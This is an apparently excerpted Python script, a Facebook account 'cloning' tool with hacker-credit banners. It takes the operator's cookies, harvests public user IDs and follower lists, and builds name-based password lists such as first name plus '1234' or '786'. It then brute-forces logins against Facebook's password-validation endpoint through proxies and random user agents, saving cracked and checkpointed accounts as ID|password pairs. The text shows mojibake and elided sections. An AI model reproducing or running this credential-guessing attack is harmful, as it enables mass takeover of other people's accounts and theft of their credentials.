#COPY_CUTERS MARA KHAWÃ°Å¸Â¤Â£Ã°Å¸Ëœâ€šÃ°Å¸Â¤Â£
...
#Chnge Name 
	print('[[\x1b[1;92mÃ¢â‚¬Â¢\x1b[1;97m] [\x1b[1;97mMR-QURESHI-XD]')
...
def banner():
	clear()
	sol()
	ban=''' Ã‚Â© RAFUðŸ¥µ NAME TO SHUNAI HUGAðŸ¤–
  
  [Ã¢â‚¬Â¢] MR ELESHðŸ‘¨â€ðŸ’»
  
[Ã¢â‚¬Â¢] Facebook: Md. Sabbir Hossain RafiðŸ¥µ

 [Ã¢â‚¬Â¢] MASTER MIND OF HACKERÃ°Å¸Â¥ÂºÃ¢ÂÂ¤Ã¯Â¸Â                                      '''
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t             WELLCOME : [green]ELESH THE BRANDðŸ¤–[purple] '))
		asu = random.choice([m,k,h,b,u])
		cookie=input(f'  [{h}Ã¢â‚¬Â¢{u}] INPUT COOKIES :{asu} ')
		...
		print(f'  {u}[{h}Ã¢â‚¬Â¢{u}]{h} LOGIN DONE.........RUN AGAIN!!!!{k} ');time.sleep(1)
		exit()
	except Exception as e:
...
def menu(my_name,my_id):
	...
	alvino_xy(f'{h}IP  : {ip}')
	cetak(nel('\t[bold cyan]           Ã¢â‚¬Â¢ CHOOSE CLONING MENU Ã¢â‚¬Â¢ [/bold cyan]'))
	print('')
	cetak(nel('[bold green] Ã¢ÂÂ¤Ã¯Â¸Â1. CRACK PUBLIK ID\n  Ã¢ÂÂ¤Ã¯Â¸Â2. CHEK RESULTS\n Ã¢ÂÂ¤Ã¯Â¸Â0. EXIT [bold green]')) 
...
def dump_massal():
	...
	try:
		print('')
		print(f'{k}=>TOTAL IDÃ¢Ëœâ€¦{b}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{u}')
		...
		print(f'Ã¢Å¾Â¥=>{k} IF ID IS PUBLIC THEN TRY AGAIN WITH NEW COOKIE OTHRWSE CHEK YOUR ID LNK {u}')
		time.sleep(3)
		back()
#-------------------[ CRACK-PENGIKUT ]----------------#
def dump_pengikut():
	...
	pil = input('Ã¢Å¾Â¥Ã¢Å¾Â£ENTER ID LNK : ')
	try:
...
#-------------[ Id -Crackiing]---------------#
def setting():
	cetak(nel('\t[bold cyan]         CLONING MENU Ã¢â‚¬Â¢ [/bold cyan]'))
	print('') 
	cetak(nel('[bold yellow]Ã¢ÂÂ¤Ã¯Â¸ÂÃ¢Å¾Â£1. CLONE JUST OLD IDZ \nÃ¢ÂÂ¤Ã¯Â¸ÂÃ¢Å¾Â£2. CLONE JUST NEW IDZ(RECOMEND)\nÃ¢ÂÂ¤Ã¯Â¸ÂÃ¢Å¾Â£3. CLONE MIX IDZ (NEW/OLD)=>RECOMEND [bold yellow]'))
	print('')
	hu = input('=>CHOOSE : ')
	if hu in ['1','01']:
		...
		print('=>TRY AGAIN')
		exit()
	cetak(nel('\t[bold cyan]             Ã¢â‚¬Â¢ METHODE LOGIN Ã¢â‚¬Â¢ [/bold cyan]'))
	print('') 
	cetak(nel('[bold purple]Ã¢ÂÂ¤Ã¯Â¸ÂÃ¢Å¾Â£1. MOBILE\nÃ¢ÂÂ¤Ã¯Â¸ÂÃ¢Å¾Â£2. MBASIC\nÃ¢ÂÂ¤Ã¯Â¸ÂÃ¢Å¾Â£3. TOUCH\nÃ¢ÂÂ¤Ã¯Â¸ÂÃ¢Å¾Â£4. MTOUCH [bold purple]')) 
	print('')
	hc = input('>> CHOOSE : ')
	if hc in ['1','01']:
		...
		method.append('mobile')
	print(f'{m}NOTE :\nÃ°Å¸â„¢â€ž{k}USE DEFULT PASS MENU ') 
	print('')
...
#   elif _jembot_ in ['y','Y']:
	...
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[purple]Ã¢â‚¬Â¢[yellow]] ADD PASWORD MXM 6 WORDS\n[[purple]Ã¢â‚¬Â¢[yellow]] EXIMPLE :[green] 556677,786786,123456[purple] '))
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	cetak(nel('[bold cyan]               WAIT FOR A WHILE Ã°Å¸Ëœâ€š[bold cyan]')) 
	print(f'                    {m}H {k}A {h}R {u}A {b}P {u}  Ã¢Ëœâ€¦  {b}S {u}A {h} B{k} A{m} R{b}')
	print('')
		...
		for yuzong in id2:
			...
			if len(nmf)<6:
				if len(frs)<3:
					...
					pwv.append(frs+'1234')
					pwv.append(frs+ last)
					pwv.append(iloveyou+'143')
					pwv.append(frs+khan+'1234')
					pwv.append(iloveyoujan+'143')
					pwv.append(last+'786')
			else:
				if len(frs)<3:
					pwv.append(nmf)
					...
					pwv.append(frs+ last+'786')
					pwv.append(frs+'1234')
					pwv.append(iloveyou+'143')
					pwv.append(frs+'123456')
					pwv.append(frs+'786')
					pwv.append(frs+'445566')
					pwv.append(frs+'124421')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
	...
	print(f'[{h}Ã¢â‚¬Â¢{u}]{h} OK : {h}%s '%(ok))
	print(f'{k}[{k}Ã¢â‚¬Â¢{h}]{k} CP : {k}%s{u} '%(cp))
	print('')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}RAFU-->{P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel('  [red]     Ã¢Å“Â¨ RAFU-CHECKPOINT Ã¢Å“Â¨ [red]'))
				...
				cetak(nel('[green]      Ã¢ÂÂ¤Ã¯Â¸ÂÃ¢Å“Â¨ RAFU-OKðŸ˜ Ã¢ÂÂ¤Ã¯Â¸ÂÃ¢Å“Â¨[green]')) 
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\rÃ¢ÂÂ¤Ã¯Â¸Â {P}[{asu}Mbasic{P}]{P}[{b}{loop}{P}/{p}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{m}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			...
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel('  [red]     Ã°Å¸ËœÂ­ MOHON MAAF ANDA BELUM BERUNTUNG MOHON BERSABAR Ã°Å¸ËœÂ­[red]'))
				print(f'\r{K}>> {idf}|{pw}{N}')     
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				...
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				cetak(nel('[purple]      Ã°Å¸ËœÂ­HELLO THIS MUSLIM-XD Ã°Å¸Â¤Â£[purple]')) 
